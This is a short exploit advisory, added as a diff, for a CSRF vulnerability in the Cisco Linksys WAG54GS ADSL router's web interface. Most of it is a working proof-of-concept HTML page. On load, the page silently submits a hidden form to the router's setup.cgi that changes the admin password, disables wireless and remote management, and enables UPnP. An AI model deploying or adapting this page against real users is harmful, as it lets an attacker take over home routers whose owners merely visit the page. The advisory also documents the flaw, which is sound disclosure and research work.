@@ -1,0 +1,63 @@
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title : Cisco Linksys WAG54GS (ADSL Router) change admin password
+# Date          : 20-02-2012
+# Author        : Ivano Binetti (http://ivanobinetti.com)
+# Vendor site   : http://www.linksysbycisco.com
+# Version       : WAG54GS 
+# Tested on     : Firmware Version: V1.01.03
++--------------------------------------------------------------------------------------------------------------------------------+
++------------------------------------------[Change Admin Account Password by Ivano Binetti]--------------------------------------+
+Summary
+
+1)Introduction
+2)Vulnerability Description
+3)Exploit
+
++---------------------------------------------------------------------------------------------------------------------------------+
+
+
+1)Introduction 
+Cisco Linksys WAG54GS is an ADSL Router which uses a web management interface -listening to default on tcp/ip port 80 - and "admin" 
+as default administrator. His default ip address is 192.168.1.1
+
+
+2)Vulnerability Description
+The web interface of this router is prone to CSRF vulnerabilities which allows to change router parameters and - among other things - 
+to change default administrator ("admin") password.
+
+3)Exploit 
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<H2>CSRF Exploit to change admin password</H2>
+<form method="POST" name="form0" action="http://192.168.1.1:80/setup.cgi">
+<input type="hidden" name="user_list" value="1"/>
+<input type="hidden" name="sysname" value="admin"/>
+<input type="hidden" name="sysPasswd" value="new_password"/>
+<input type="hidden" name="sysConfirmPasswd" value="new_password"/>
+<input type="hidden" name="remote_management" value="disable"/>
+<input type="hidden" name="devname" value=""/>
+<input type="hidden" name="snmp_enable" value="disable"/>
+<input type="hidden" name="upnp_enable" value="enable"/>
+<input type="hidden" name="wlan_enable" value="disable"/>
+<input type="hidden" name="save" value="Save+Settings"/>
+<input type="hidden" name="h_user_list" value="1"/>
+<input type="hidden" name="h_pwset" value="yes"/>
+<input type="hidden" name="sysname_changed" value="no"/>
+<input type="hidden" name="pwchanged" value="yes"/>
+<input type="hidden" name="pass_is_default" value="false"/>
+<input type="hidden" name="pass_is_none" value="no"/>
+<input type="hidden" name="h_remote_management" value="disable"/>
+<input type="hidden" name="c4_trap_ip_" value=""/>
+<input type="hidden" name="h_snmp_enable" value="disable"/>
+<input type="hidden" name="h_upnp_enable" value="enable"/>
+<input type="hidden" name="h_wlan_enable" value="disable"/>
+<input type="hidden" name="todo" value="save"/>
+<input type="hidden" name="this_file" value="Administration.htm"/>
+<input type="hidden" name="next_file" value="Administration.htm"/>
+<input type="hidden" name="message" value=""/>
+</form>
+</body>
+</html>
+
+
++----------------------------------------------------------------------------------------------------------------------------------+
